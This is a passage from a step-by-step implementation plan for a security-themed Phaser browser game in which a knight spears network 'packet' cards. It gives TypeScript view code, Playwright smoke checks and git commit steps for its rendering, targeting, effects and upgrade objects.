      for (let i = 0; i < r.steps; i++) this.dispatch(this.run.step(STEP));
    }
    for (const v of this.views) v.frame?.(this.run, dt, this.time);
  }

  private key(e: KeyboardEvent): void {
    const el = e.target as HTMLElement | null;
    const inField = !!el && (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA' || el.isContentEditable);
    const action = routeKey({ key: e.key, shiftKey: e.shiftKey, inField }, this.screen);
    if (!action) return;
    e.preventDefault();
    this.act(action);
  }

  act(a: Action): void {
    const run = this.run;
    if (!run || !a) return;
    switch (a) {
      case 'laneUp': this.dispatch(run.moveLane(-1)); break;
      case 'laneDown': this.dispatch(run.moveLane(1)); break;
      case 'next': this.dispatch(run.cycleTarget(1)); break;
      case 'prev': this.dispatch(run.cycleTarget(-1)); break;
      case 'throw': this.dispatch(run.throwSpear()); break;
      case 'release': this.dispatch(run.target(null)); break;
      case 'hints':
        if (run.state.cfg.root) break;
        run.setHints(!run.state.hints);
        this.store.setPrefs({ hints: run.state.hints });
        this.refresh();
        break;
      case 'pause': this.setScreen(this.screen === 'paused' ? 'playing' : 'paused'); break;
      case 'console': this.setScreen('console'); break;
      case 'closeConsole': this.setScreen(this.beforeConsole); break;
    }
  }
}
```

- [ ] **Step 8: Wire it in `src/main.ts`**

Replace the `boot` function (keep the font imports and `loadFonts`):
```ts
const boot = async (): Promise<void> => {
  await loadFonts();
  const store = createStore();
  setLang(store.prefs().lang ?? detectLang());
  const game = new Phaser.Game({
    type: Phaser.WEBGL,
    parent: 'stage',
    width: SCREEN_W * RENDER_SCALE,
    height: SCREEN_H * RENDER_SCALE,
    backgroundColor: '#292929',
    scale: { mode: Phaser.Scale.FIT, autoCenter: Phaser.Scale.CENTER_BOTH },
    render: { antialias: true },
    scene: [FieldScene],
  });
  const scene = await FieldScene.ready;
  const app = new App(scene, store);
  app.add(new LanesView(scene), new FireWallView(scene), new RackView(scene), new ActorsView(scene));
  (window as unknown as { __nsp: unknown }).__nsp = { game, app };
  // Until the title screen exists (Task 18), boot straight into a campaign.
  app.startRun('campaign');
};
```

Add the imports to `main.ts` (local group):
```ts
import { App } from './app';
import { ActorsView } from './game/views/actors';
import { FireWallView } from './game/views/fireWall';
import { LanesView } from './game/views/lanes';
import { RackView } from './game/views/rack';
import { detectLang, setLang } from './i18n';
import { createStore } from './storage';
```

- [ ] **Step 9: Smoke check `loop`**

Add to `CHECKS` in `scripts/smoke.mjs`:
```js
  async loop(page) {
    await page.waitForFunction(() => window.__nsp?.app?.run?.state?.packets?.length > 0, null, { timeout: 15000 });
    const before = await page.evaluate(() => window.__nsp.app.run.state.knight.lane);
    await page.keyboard.press('ArrowUp');
    await page.waitForTimeout(400);
    const after = await page.evaluate(() => window.__nsp.app.run.state.knight);
    if (after.lane !== before - 1) throw new Error(`lane ${before} -> ${after.lane}`);
    await page.screenshot({ path: `${OUT}/loop.png` });
  },
```

Run: `npm run lint && npm test && node scripts/smoke.mjs boot loop`
Expected: both PASS. Open `smoke-out/loop.png`: five lanes with dashed separators and a highlighted lane, the blue wall of fire, the knight between fire and rack, the full-height rack with blinking LEDs. (Packets are not drawn yet; they arrive in Task 14.)

- [ ] **Step 10: Commit**

```bash
git add -A
git commit -m "Wire the Run into a Phaser scene with the field's static views" -m "A fixed-step loop drives the core and fans events out to views; the lanes, the wall of fire, the burning rack and the knight now render from run state." -m "Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```

---
### Task 14: Packet cards, bugs, targeting and effects

**Files:**
- Create: `src/game/cards.ts`, `src/game/views/packets.ts`, `src/game/views/effects.ts`
- Modify: `src/main.ts` (register the two views, add `reducedFx`), `scripts/smoke.mjs` (add `packets` and `resizeAndClick` checks)

**Interfaces:**
- Consumes: `Run`, `RunEvent`, `Packet`, `packetY`, geometry constants, `HOLD_SECS`, `isBugged`, `BUG_OF`, `CSS`/`HEX`, `t`, `RENDER_SCALE`, App (`dispatch`, `run`).
- Produces:
  - `cards.ts`: `type CardState = 'idle' | 'hover' | 'locked' | 'held' | 'slowed'`; `drawCard(ctx: CanvasRenderingContext2D, o: { src: string; port: string; text: string; hints: string[]; hintsOn: boolean; decodedTag: string | null; state: CardState }): void`; `CARD_TEX_W = 580`, `CARD_TEX_H = 104`.
  - `PacketsView(scene, intents: { target(id: number | null): void; hover(p: Packet | null): void })`.
  - `EffectsView(scene)` with `reduced: boolean`.

- [ ] **Step 1: Card renderer**

`src/game/cards.ts`:
```ts
// core
import { CSS } from '../core/palette';

export type CardState = 'idle' | 'hover' | 'locked' | 'held' | 'slowed';
export const CARD_TEX_W = 580;
export const CARD_TEX_H = 104;
const S = 2;

const BG: Record<CardState, string> = { idle: CSS.sub, hover: '#3b3b3b', locked: '#3a2e2e', held: '#33302a', slowed: '#2c2a26' };
const BORDER: Record<CardState, string> = { idle: CSS.dim, hover: CSS.ink, locked: CSS.red, held: CSS.gold, slowed: CSS.dim };

const fit = (ctx: CanvasRenderingContext2D, text: string, max: number): string => {
  if (ctx.measureText(text).width <= max) return text;
  let lo = 0, hi = text.length;
  while (lo < hi) {
    const mid = Math.ceil((lo + hi) / 2);
    if (ctx.measureText(`${text.slice(0, mid)}…`).width <= max) lo = mid; else hi = mid - 1;
  }
  return `${text.slice(0, lo)}…`;
};

// Draws one packet card into a 2x canvas: source and lane on top, payload below.
export const drawCard = (ctx: CanvasRenderingContext2D, o: { src: string; port: string; text: string; hints: string[]; hintsOn: boolean; decodedTag: string | null; state: CardState }): void => {
  ctx.clearRect(0, 0, CARD_TEX_W, CARD_TEX_H);
  ctx.fillStyle = BG[o.state];
  ctx.fillRect(0, 0, CARD_TEX_W, CARD_TEX_H);
  ctx.strokeStyle = BORDER[o.state];
  ctx.lineWidth = 2;
  ctx.strokeRect(1, 1, CARD_TEX_W - 2, CARD_TEX_H - 2);
  if (o.state === 'locked') {
    ctx.fillStyle = CSS.red; ctx.fillRect(0, 0, 6, CARD_TEX_H);
    ctx.fillStyle = CSS.blue; ctx.fillRect(CARD_TEX_W - 6, 0, 6, CARD_TEX_H);
  }
  ctx.textBaseline = 'alphabetic';
  ctx.font = `${13 * S}px "Space Mono"`;
  ctx.fillStyle = CSS.dim;
  ctx.textAlign = 'left';
  ctx.fillText(o.src, 9 * S, 19 * S);
  ctx.textAlign = 'right';
  ctx.fillText(o.port, CARD_TEX_W - 9 * S, 19 * S);
  ctx.textAlign = 'left';
  let x = 9 * S;
  if (o.decodedTag) {
    ctx.font = `700 ${13 * S}px "Space Mono"`;
    const w = ctx.measureText(o.decodedTag).width + 8 * S;
    ctx.fillStyle = CSS.blue; ctx.fillRect(x, 26 * S, w, 17 * S);
    ctx.fillStyle = CSS.paper; ctx.fillText(o.decodedTag, x + 4 * S, 39 * S);
    x += w + 5 * S;
  }
  ctx.font = `${14 * S}px "IBM Plex Mono"`;
  const shown = fit(ctx, o.text, CARD_TEX_W - 9 * S - x);
  ctx.fillStyle = CSS.ink;
  ctx.fillText(shown, x, 40 * S);
  if (!o.hintsOn) return;
  ctx.strokeStyle = CSS.red;
  ctx.lineWidth = 2;
  for (const h of o.hints) {
    let from = 0, i: number;
    while ((i = shown.indexOf(h, from)) >= 0) {
      const x0 = x + ctx.measureText(shown.slice(0, i)).width;
      const w = ctx.measureText(h).width;
      ctx.beginPath();
      for (let dx = 0; dx <= w; dx += 2) ctx.lineTo(x0 + dx, 45 * S + Math.sin(dx / 3) * 2);
      ctx.stroke();
      from = i + h.length;
    }
  }
};
```

- [ ] **Step 2: Packets view**

`src/game/views/packets.ts`:
```ts
// packages
import Phaser from 'phaser';

// core
import { FIELD_TOP, FW_X, HOLD_SECS, PKT_H, PKT_W } from '../../core/constants';
import type { RunEvent } from '../../core/events';
import { CSS, HEX } from '../../core/palette';
import { isBugged } from '../../core/rules';
import type { Run } from '../../core/run';
import { packetY, type Packet } from '../../core/state';

// art
import { BUG_OF, type BugKind } from '../../art/sprites';

// i18n
import { t } from '../../i18n';

// stage
import { RENDER_SCALE } from '../../stage';

// game
import { CARD_TEX_H, CARD_TEX_W, drawCard, type CardState } from '../cards';
import type { FieldScene } from '../FieldScene';
import type { View } from '../view';

const PORT_LABEL = [':22', '/login', '/search', '/comments', ':*'];
const POOL = 48;

interface Visual { slot: number; img: Phaser.GameObjects.Image; bugs: { s: Phaser.GameObjects.Sprite; kind: BugKind; path: number; phase: number }[]; key: string }

// Bug paths around a card (local coords): along the top, along the bottom, a worm's wiggle, a fly's buzz.
const bugPose = (kind: BugKind, path: number, time: number, phase: number): { x: number; y: number; rot: number; flip: boolean } => {
  if (kind === 'fly' || kind === 'gnat') {
    const a = time * (path ? 6.1 : 7.3) + phase;
    return { x: (path ? 40 : 250) + Math.sin(a) * 14, y: -10 + Math.cos(a * 1.3) * 20, rot: Math.sin(a * 0.7) * 0.4, flip: false };
  }
  const u = ((time / (path ? 6.5 : 5)) + phase) % 1;
  const out = u < 0.5, k = out ? u / 0.5 : (u - 0.5) / 0.5;
  const x = out ? 8 + k * 242 : 250 - k * 242;
  if (kind === 'worm') return { x, y: -6, rot: 0, flip: !out };
  return { x: path ? 258 - x : x, y: path ? 52 : -10, rot: (out !== !!path ? 1 : -1) * Math.PI / 2, flip: false };
};

export class PacketsView implements View {
  private readonly visuals = new Map<number, Visual>();
  private readonly free: number[] = Array.from({ length: POOL }, (_, i) => i);
  private readonly overlay: Phaser.GameObjects.Graphics;
  private readonly tag: Phaser.GameObjects.Text;
  private hovered: number | null = null;
  private run: Run | null = null;

  constructor(private readonly scene: FieldScene, private readonly intents: { target(id: number | null): void; hover(p: Packet | null): void }) {
    for (let i = 0; i < POOL; i++) scene.textures.createCanvas(`card-${i}`, CARD_TEX_W, CARD_TEX_H);
    this.overlay = scene.add.graphics();
    this.tag = scene.add.text(0, 0, t('actor.target'), { fontFamily: 'Space Mono', fontSize: '13px', fontStyle: '700', color: CSS.ink, backgroundColor: CSS.red, padding: { x: 6, y: 0 }, resolution: RENDER_SCALE }).setVisible(false);
    scene.layers.packets.add([this.overlay, this.tag]);
    scene.input.on('pointermove', (ptr: Phaser.Input.Pointer) => this.onMove(ptr));
    scene.input.on('pointerdown', (ptr: Phaser.Input.Pointer) => this.onDown(ptr));
  }

  private at(ptr: Phaser.Input.Pointer): Packet | null {
    const x = ptr.worldX, y = ptr.worldY - FIELD_TOP;
    const hit = this.run?.state.packets.filter((p) => !p.dead && !p.entering && x >= p.x && x <= p.x + PKT_W && y >= packetY(p) && y <= packetY(p) + PKT_H);
    return hit?.length ? hit[hit.length - 1] : null;
  }

  private onMove(ptr: Phaser.Input.Pointer): void {
    const p = this.at(ptr);
    if ((p?.id ?? null) !== this.hovered) { this.hovered = p?.id ?? null; this.intents.hover(p); }
  }

  private onDown(ptr: Phaser.Input.Pointer): void {
    if (!this.run || this.run.state.phase !== 'playing') return;
    const p = this.at(ptr);
    this.intents.target(p && this.run.state.locked !== p.id ? p.id : null);
  }

  start(run: Run): void {
    this.run = run;
    for (const id of [...this.visuals.keys()]) this.drop(id);
  }

  refresh(): void {
    for (const v of this.visuals.values()) v.key = '';
    this.tag.setText(t('actor.target'));
  }

  event(ev: RunEvent, run: Run): void {
    if (ev.type === 'spawned') this.create(ev.packet, run);
    if (ev.type === 'shattered') this.drop(ev.packet.id);
    if (ev.type === 'consumed') this.drop(ev.packetId);
    if (ev.type === 'owned') this.refresh();
  }

  private create(p: Packet, run: Run): void {
    const slot = this.free.shift();
    if (slot === undefined) return;
    const img = this.scene.add.image(p.x, packetY(p), `card-${slot}`).setOrigin(0, 0).setScale(1 / 2);
    this.scene.layers.packets.addAt(img, 0);
    const bugs: Visual['bugs'] = [];
    if (isBugged(p.t, run.state.owned)) {
      const kind = BUG_OF[p.t.kind as Exclude<typeof p.t.kind, 'legit'>];
      const count = p.t.tier === 1 ? 2 : 1;
      for (let i = 0; i < count; i++) {
        const s = this.scene.add.sprite(0, 0, `bug-${kind}-0`);
        this.scene.layers.packets.add(s);
        bugs.push({ s, kind, path: i, phase: Math.random() });
      }
    }
    this.visuals.set(p.id, { slot, img, bugs, key: '' });
  }

  private drop(id: number): void {
    const v = this.visuals.get(id);
    if (!v) return;
    v.img.destroy();
    for (const b of v.bugs) b.s.destroy();
    this.free.push(v.slot);
    this.visuals.delete(id);
  }

  private paint(p: Packet, v: Visual, run: Run): void {
    const s = run.state;
    const state: CardState = s.locked === p.id ? (p.held ? 'held' : 'locked') : p.doomed ? 'locked' : this.hovered === p.id ? 'hover' : p.slowed ? 'slowed' : 'idle';
    const lens = s.owned.includes('lens') && !!p.t.decoded;
    const key = `${state}|${s.hints}|${lens}|${t('inspector.decoded')}`;
    if (key === v.key) return;
    v.key = key;
    const tex = this.scene.textures.get(`card-${v.slot}`) as Phaser.Textures.CanvasTexture;
    drawCard(tex.getContext(), {
      src: p.src, port: PORT_LABEL[p.lane], text: lens ? p.t.decoded! : p.t.card,
      hints: (lens ? p.t.decodedHints ?? p.t.hints : p.t.hints) ?? [], hintsOn: s.hints, decodedTag: lens ? t('inspector.decoded') : null, state,
    });
    tex.refresh();
  }

  frame(run: Run | null, _dt: number, time: number): void {
    this.overlay.clear();
    this.tag.setVisible(false);
    if (!run) return;
    for (const p of run.state.packets) {
      const v = this.visuals.get(p.id);
      if (!v) continue;
      const y = packetY(p);
      this.paint(p, v, run);
      v.img.setPosition(p.x, y);
      v.img.setCrop(0, 0, p.entering ? Math.max(0, (FW_X - p.x) * 2) : CARD_TEX_W, CARD_TEX_H);
      for (const b of v.bugs) {
        const pose = bugPose(b.kind, b.path, time, b.phase);
        b.s.setPosition(p.x + pose.x, y + pose.y).setRotation(pose.rot).setFlipX(pose.flip);
        b.s.setTexture(`bug-${b.kind}-${Math.floor(time / 0.12) % 2}`);
        b.s.setVisible(p.x + pose.x < FW_X);
      }
    }
    const locked = run.state.locked !== null ? run.state.packets.find((p) => p.id === run.state.locked) : undefined;
    if (!locked) return;
    const x = locked.x, y = packetY(locked), r = Math.floor(time / 0.25) % 2 ? 20 : 16;
    this.overlay.lineStyle(3, HEX.red, 1);
    this.overlay.strokePoints([{ x: x - 9, y: y - 9 + r }, { x: x - 9, y: y - 9 }, { x: x - 9 + r, y: y - 9 }]);
    this.overlay.strokePoints([{ x: x + PKT_W + 9 - r, y: y + PKT_H + 9 }, { x: x + PKT_W + 9, y: y + PKT_H + 9 }, { x: x + PKT_W + 9, y: y + PKT_H + 9 - r }]);
    if (locked.held) {
      this.overlay.fillStyle(HEX.gold, 1);
      this.overlay.fillRect(x, y + PKT_H + 3, PKT_W * Math.max(0, run.state.knight.hold / HOLD_SECS), 4);
    }
    this.tag.setPosition(x, y - 19).setVisible(true);
  }
}
```

- [ ] **Step 3: Effects view**

`src/game/views/effects.ts`:
```ts
// packages
import Phaser from 'phaser';

// core
import { FW_X, PKT_H, PKT_W, RACK_TARGET } from '../../core/constants';
import type { RunEvent } from '../../core/events';
import { CSS, HEX } from '../../core/palette';
import type { Run } from '../../core/run';
import { packetY } from '../../core/state';

// game
import type { FieldScene } from '../FieldScene';
import type { View } from '../view';

const GLYPHS = "01<>/'=;%(){}";
const COLORS: Record<string, string> = { ink: CSS.ink, red: CSS.red, blue: CSS.blue, gold: CSS.gold, brick: '#a8432a', cyan: '#8fdcff' };
const PALETTES: Record<string, string[]> = {
  knight: ['ink', 'ink', 'red', 'blue'], rule: ['blue', 'blue', 'ink'], squire: ['gold', 'ink', 'ink'], lockdown: ['red', 'brick', 'ink'], stream: ['ink', 'ink', 'cyan'],
};

const frames = (palette: string[]): string[] => palette.flatMap((c) => [...GLYPHS].map((g) => `${c}:${g}`));

export class EffectsView implements View {
  reduced = false;
  private readonly shatter: Record<string, Phaser.GameObjects.Particles.ParticleEmitter> = {};
  private readonly stream: Phaser.GameObjects.Particles.ParticleEmitter;
  private readonly emitted = new Map<number, number>();

  constructor(private readonly scene: FieldScene) {
    this.buildGlyphs();
    const fx = scene.layers.fx;
    for (const [name, pal] of Object.entries(PALETTES)) {
      if (name === 'stream') continue;
      const em = scene.add.particles(0, 0, 'glyphs', {
        frame: frames(pal), emitting: false, lifespan: { min: 520, max: 1000 }, speed: { min: 40, max: 230 }, angle: { min: 0, max: 360 },
        accelerationX: -90, rotate: { min: -180, max: 180 }, alpha: { start: 1, end: 0 }, scale: { min: 0.42, max: 0.62 },
      });
      em.addEmitZone({ type: 'random', source: new Phaser.Geom.Rectangle(0, 0, PKT_W, PKT_H) });
      fx.add(em);
      this.shatter[name] = em;
    }
    this.stream = scene.add.particles(0, 0, 'glyphs', {
      frame: frames(PALETTES.stream), emitting: false, lifespan: { min: 380, max: 640 },
      moveToX: { min: RACK_TARGET.x0, max: RACK_TARGET.x1 }, moveToY: { min: RACK_TARGET.y0, max: RACK_TARGET.y1 },
      alpha: { start: 1, end: 0.15 }, scale: { start: 0.55, end: 0.25 },
    });
    fx.add(this.stream);
  }

  // One 2x canvas with every glyph in every colour, sliced into named frames.
  private buildGlyphs(): void {
    if (this.scene.textures.exists('glyphs')) return;
    const cell = 32, cols = GLYPHS.length, names = Object.keys(COLORS);
    const tex = this.scene.textures.createCanvas('glyphs', cell * cols, cell * names.length)!;
    const ctx = tex.getContext();
    ctx.font = '600 28px "IBM Plex Mono"';
    ctx.textAlign = 'center';
    ctx.textBaseline = 'middle';
    names.forEach((c, row) => [...GLYPHS].forEach((g, col) => {
      ctx.fillStyle = COLORS[c];
      ctx.fillText(g, col * cell + cell / 2, row * cell + cell / 2);
      tex.add(`${c}:${g}`, 0, col * cell, row * cell, cell, cell);
    }));
    tex.refresh();
  }

  pause(p: boolean): void {
    if (p) { this.scene.tweens.pauseAll(); this.scene.time.paused = true; } else { this.scene.tweens.resumeAll(); this.scene.time.paused = false; }
    for (const em of [...Object.values(this.shatter), this.stream]) { if (p) em.pause(); else em.resume(); }
  }

  start(): void {
    this.emitted.clear();
  }

  event(ev: RunEvent): void {
    if (ev.type === 'shattered') {
      const p = ev.packet, y = packetY(p);
      const pal = ev.by === 'rule' ? (ev.ruleId === 'lockdown' ? 'lockdown' : 'rule') : ev.by;
      this.shatter[pal].explode(this.reduced ? 18 : 56, p.x, y);
      const box = this.scene.add.rectangle(p.x, y, PKT_W, PKT_H, HEX.ink, 0.75).setOrigin(0, 0);
      this.scene.layers.fx.add(box);
      this.scene.tweens.add({ targets: box, alpha: 0, duration: 140, onComplete: () => box.destroy() });
    }
    if (ev.type === 'thrown') this.spear(ev.from, ev.to, ev.duration, ev.by === 'squire');
    if (ev.type === 'consumed') this.emitted.delete(ev.packetId);
  }

  private spear(from: { x: number; y: number }, to: { x: number; y: number }, duration: number, small: boolean): void {
    const key = small ? 'spear-small' : 'spear';
    const dist = Math.hypot(to.x - from.x, to.y - from.y);
    const cx = (from.x + to.x) / 2, cy = Math.min(from.y, to.y) - Math.min(70, dist * 0.14);
    const pose = (t: number) => {
      const u = 1 - t;
      const x = u * u * from.x + 2 * u * t * cx + t * t * to.x, y = u * u * from.y + 2 * u * t * cy + t * t * to.y;
      const dx = 2 * u * (cx - from.x) + 2 * t * (to.x - cx), dy = 2 * u * (cy - from.y) + 2 * t * (to.y - cy);
      return { x, y, rot: Math.atan2(dy, dx) - Math.PI };
    };
    const ghosts = this.reduced ? [] : [HEX.red, HEX.blue].map((c) => this.scene.add.image(from.x, from.y, key).setTint(c).setAlpha(0.45));
    const main = this.scene.add.image(from.x, from.y, key);
    this.scene.layers.fx.add([...ghosts, main]);
    this.scene.tweens.addCounter({
      from: 0, to: 1, duration: duration * 1000,
      onUpdate: (tw) => {
        const t = tw.getValue() ?? 0, p = pose(t);
        main.setPosition(p.x, p.y).setRotation(p.rot);
        ghosts.forEach((g, i) => { const q = pose(Math.max(0, t - 0.04 * (i + 1))); g.setPosition(q.x, q.y + (i ? 3 : -3)).setRotation(q.rot); });
      },
      onComplete: () => {
        ghosts.forEach((g) => g.destroy());
        this.scene.tweens.add({ targets: main, alpha: 0, duration: 120, onComplete: () => main.destroy() });
      },
    });
  }

  frame(run: Run | null): void {
    if (!run) return;
    for (const p of run.state.packets) {
      if (!p.entering) continue;
      const eaten = Math.max(0, p.x + PKT_W - FW_X);
      const target = Math.floor(eaten / (this.reduced ? 12 : 5));
      const done = this.emitted.get(p.id) ?? 0;
      for (let i = done; i < target; i++) this.stream.emitParticleAt(FW_X + 16, packetY(p) + Math.random() * PKT_H, 1);
      this.emitted.set(p.id, target);
    }
  }
}
```

- [ ] **Step 4: Register in `src/main.ts`**

After `app.add(new LanesView(scene), ...)`, add:
```ts
  const effects = new EffectsView(scene);
  effects.reduced = !!store.prefs().reducedFx || window.matchMedia('(prefers-reduced-motion: reduce)').matches;
  app.add(
    new PacketsView(scene, {
      target: (id) => { if (app.run) app.dispatch(app.run.target(id)); },
      hover: () => {},
    }),
    effects,
  );
```
and the imports `import { EffectsView } from './game/views/effects';` and `import { PacketsView } from './game/views/packets';`. (The `hover` intent is connected to the inspector in Task 17.)

- [ ] **Step 5: Smoke checks `packets` and `resizeAndClick`**

Add to `CHECKS`:
```js
  async packets(page) {
    await page.waitForFunction(() => window.__nsp?.app?.run?.state?.packets?.some((p) => p.x > 200), null, { timeout: 20000 });
    const lane = await page.evaluate(() => window.__nsp.app.run.state.packets.find((p) => p.x > 200).lane);
    const here = await page.evaluate(() => window.__nsp.app.run.state.knight.lane);
    for (let i = here; i > lane; i--) await page.keyboard.press('ArrowUp');
    for (let i = here; i < lane; i++) await page.keyboard.press('ArrowDown');
    await page.keyboard.press('Tab');
    if (await page.evaluate(() => window.__nsp.app.run.state.locked) === null) throw new Error('Tab did not target');
    await page.screenshot({ path: `${OUT}/packets-target.png` });
    await page.keyboard.press('Space');
    await page.waitForTimeout(160);
    await page.screenshot({ path: `${OUT}/packets-spear.png` });
    await page.waitForFunction(() => window.__nsp.app.run.state.log.some((e) => e.outcome === 'hit' || e.outcome === 'fp'), null, { timeout: 3000 });
    await page.screenshot({ path: `${OUT}/packets-shatter.png` });
  },
  async resizeAndClick(page) {
    const clickPacket = async () => {
      await page.waitForFunction(() => window.__nsp.app.run.state.packets.some((p) => p.x > 250 && p.x < 550 && !p.entering), null, { timeout: 20000 });
      const target = await page.evaluate(() => {
        const s = window.__nsp.app.run.state;
        const p = s.packets.find((q) => q.x > 250 && q.x < 550 && !q.entering);
        const r = document.querySelector('#stage canvas').getBoundingClientRect();
        const k = r.width / 1280;
        return { id: p.id, x: r.left + (p.x + 145) * k, y: r.top + (56 + p.lane * 90 + 19 + 26) * k };
      });
      await page.mouse.click(target.x, target.y);
      const locked = await page.evaluate(() => window.__nsp.app.run.state.locked);
      if (locked !== target.id) throw new Error(`clicked ${target.id}, locked ${locked}`);
      await page.keyboard.press('Escape');
    };
    await page.setViewportSize({ width: 1100, height: 700 });
    await page.waitForTimeout(300);
    await clickPacket();
    await page.setViewportSize({ width: 1700, height: 960 });
    await page.waitForTimeout(300);
    await clickPacket();
  },
```

Run: `npm run lint && npm test && node scripts/smoke.mjs boot loop packets resizeAndClick`
Expected: all PASS. Look at the three `packets-*.png` screenshots: cards readable and crisp (Space Mono source line, IBM Plex Mono payload), red brackets and `TARGET · SPACE` tag on the target, a spear on an arc mid-flight, a burst of 0/1 glyphs where the card was. Packets reaching the fire are eaten from the front edge while glyphs stream into the rack.

- [ ] **Step 6: Commit**

```bash
git add -A
git commit -m "Draw packet cards, bugs, targeting and the spear and shatter effects" -m "Cards render to pooled 2x canvases so text stays crisp; spears fly the arc the core timed, packets shatter into binary, and survivors burn into the rack as a stream of glyphs." -m "Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```

---
### Task 15: Upgrades as objects on the field

**Files:**
- Create: `src/game/views/fieldObjects.ts`
- Modify: `src/main.ts` (register the view), `scripts/smoke.mjs` (add `objects` check)

**Interfaces:**
- Consumes: `Run`, `RunEvent`, `CardId`, constants (`LOCK_X`, `LANE_H`, `FW_X`, `TAR_X0`, `TAR_X1`), `CSS`/`HEX`, `t`, `RENDER_SCALE`, textures `lock-shut`, `lock-open`, `hammer`.
- Produces: `FieldObjectsView(scene)`; rebuilds on `start`, on every `owned` event and on `refresh`; reacts to rule kills (`lockdown` row flashes DENIED, `f2b` hammer slams) and `banned`.

- [ ] **Step 1: Implement `src/game/views/fieldObjects.ts`**

```ts
// packages
import Phaser from 'phaser';

// core
import { FIELD_H, FW_X, LANE_H, LOCK_X, TAR_X0, TAR_X1 } from '../../core/constants';
import type { CardId } from '../../core/content/cards';
import type { RunEvent } from '../../core/events';
import { CSS, HEX } from '../../core/palette';
import type { Run } from '../../core/run';

// i18n
import { t } from '../../i18n';

// stage
import { RENDER_SCALE } from '../../stage';

// game
import type { FieldScene } from '../FieldScene';
import type { View } from '../view';

const PORTS = [{ n: 23, open: false }, { n: 445, open: false }, { n: 3389, open: false }, { n: 25, open: true }];

const sign = (scene: FieldScene, x: number, y: number, text: string, color: string = CSS.ink): Phaser.GameObjects.Text =>
  scene.add.text(x, y, text, { fontFamily: 'Space Mono', fontSize: '13px', color, backgroundColor: 'rgba(28,28,28,0.92)', padding: { x: 6, y: 1 }, resolution: RENDER_SCALE });

export class FieldObjectsView implements View {
  private objects: Phaser.GameObjects.GameObject[] = [];
  private rows = new Map<number, { bg: Phaser.GameObjects.Rectangle; label: Phaser.GameObjects.Text; open: boolean }>();
  private hammer: Phaser.GameObjects.Image | null = null;
  private banned: Phaser.GameObjects.Text | null = null;
  private bubbles: Phaser.GameObjects.Arc[] = [];
  private bannedCount = 0;

  constructor(private readonly scene: FieldScene) {
    if (!scene.textures.exists('portcullis')) {
      const tex = scene.textures.createCanvas('portcullis', 9, 14);
      if (tex) { const c = tex.getContext(); c.fillStyle = '#8f9bb3'; c.fillRect(0, 0, 3, 14); c.fillRect(0, 0, 9, 3); tex.refresh(); }
    }
  }

  start(run: Run): void {
    this.bannedCount = 0;
    this.build(run.state.owned);
  }

  refresh(run: Run | null): void {
    if (run) this.build(run.state.owned);
  }

  event(ev: RunEvent): void {
    if (ev.type === 'owned') this.build(ev.owned);
    if (ev.type === 'banned') { this.bannedCount = ev.count; this.banned?.setText(t('field.banned', { n: ev.count })); }
    if (ev.type === 'shattered' && ev.by === 'rule' && ev.ruleId === 'lockdown' && ev.packet.t.port) this.deny(ev.packet.t.port);
    if (ev.type === 'shattered' && ev.by === 'rule' && ev.ruleId === 'f2b' && this.hammer) {
      this.scene.tweens.chain({ targets: this.hammer, tweens: [{ angle: -55, duration: 120 }, { angle: 10, duration: 90 }, { angle: 0, duration: 90 }] });
    }
  }

  private add<T extends Phaser.GameObjects.GameObject>(obj: T, layer: 'back' | 'objects' = 'objects'): T {
    this.scene.layers[layer].add(obj);
    this.objects.push(obj);
    return obj;
  }

  private build(owned: CardId[]): void {
    for (const o of this.objects) o.destroy();
    this.objects = [];
    this.rows.clear();
    this.hammer = null;
    this.banned = null;
    this.bubbles = [];
    const s = this.scene;

    if (owned.includes('lockdown')) {
      const y0 = 4 * LANE_H + 2;
      this.add(s.add.rectangle(LOCK_X, y0, 78, 86, 0x121317).setOrigin(0, 0).setStrokeStyle(2, 0x3c414d));
      PORTS.forEach((pt, i) => {
        const y = y0 + 3 + i * 20.5;
        const bg = this.add(s.add.rectangle(LOCK_X + 3, y, 72, 19, 0x1b1d24).setOrigin(0, 0));
        if (pt.open) bg.setStrokeStyle(1, HEX.blue);
        const label = this.add(s.add.text(LOCK_X + 7, y + 1, `:${pt.n}`, { fontFamily: 'Space Mono', fontSize: '13px', fontStyle: '700', color: pt.open ? CSS.blue : CSS.dim, resolution: RENDER_SCALE }));
        this.add(s.add.image(LOCK_X + 56, y + 0.5, pt.open ? 'lock-open' : 'lock-shut').setOrigin(0, 0));
        this.rows.set(pt.n, { bg, label, open: pt.open });
      });
      this.add(sign(s, LOCK_X - 6, y0, t('field.lockdown')).setOrigin(1, 0));
    }

    if (owned.includes('quote')) {
      this.add(s.add.tileSprite(888, 0, 18, FIELD_H, 'portcullis').setOrigin(0, 0).setAlpha(0.85));
      this.add(s.add.rectangle(887, 0, 2, FIELD_H, 0x5d6680).setOrigin(0, 0));
    }

    if (owned.includes('f2b')) {
      this.hammer = this.add(s.add.image(836 + 34, 52 + 38, 'hammer').setOrigin(0.7, 0.9));
      this.banned = this.add(sign(s, 832, 94, t('field.banned', { n: this.bannedCount })));
    }

    if (owned.includes('tarpit')) {
      const y = LANE_H + 60;
      this.add(s.add.rectangle(TAR_X0, y, TAR_X1 - TAR_X0, 26, 0x101114).setOrigin(0, 0), 'back');
      for (let i = 0; i < 9; i++) this.bubbles.push(this.add(s.add.circle(TAR_X0 + 12 + i * 25, y + 13, 3, 0x3a3d4a), 'back'));
      this.add(sign(s, TAR_X0, LANE_H + 2, t('field.tarpit')));
    }

    if (owned.includes('cdn')) {
      this.add(s.add.rectangle(FW_X - 70, LANE_H, 70, 3 * LANE_H, HEX.blue, 0.08).setOrigin(0, 0), 'back');
      this.add(sign(s, FW_X - 8, LANE_H + 4, t('field.cdn'), CSS.blue).setOrigin(1, 0));
    }
  }

  private deny(port: number): void {
    const row = this.rows.get(port);
    if (!row || row.open) return;
    row.bg.setFillStyle(HEX.red);
    row.label.setColor(CSS.ink);
    this.scene.time.delayedCall(300, () => { row.bg.setFillStyle(0x1b1d24); row.label.setColor(CSS.dim); });
  }

  frame(_run: Run | null, _dt: number, time: number): void {
    this.bubbles.forEach((b, i) => b.setY(LANE_H + 73 + Math.sin(time * 2.4 + i * 1.7) * 3).setAlpha(0.5 + Math.sin(time * 3 + i) * 0.4));
  }
}
```

- [ ] **Step 2: Register and smoke-check**

In `src/main.ts`, add `new FieldObjectsView(scene)` to the first `app.add(...)` call (after `RackView`, before `ActorsView`) and import it from `./game/views/fieldObjects`.

Add to `CHECKS` in `scripts/smoke.mjs`:
```js
  async objects(page) {
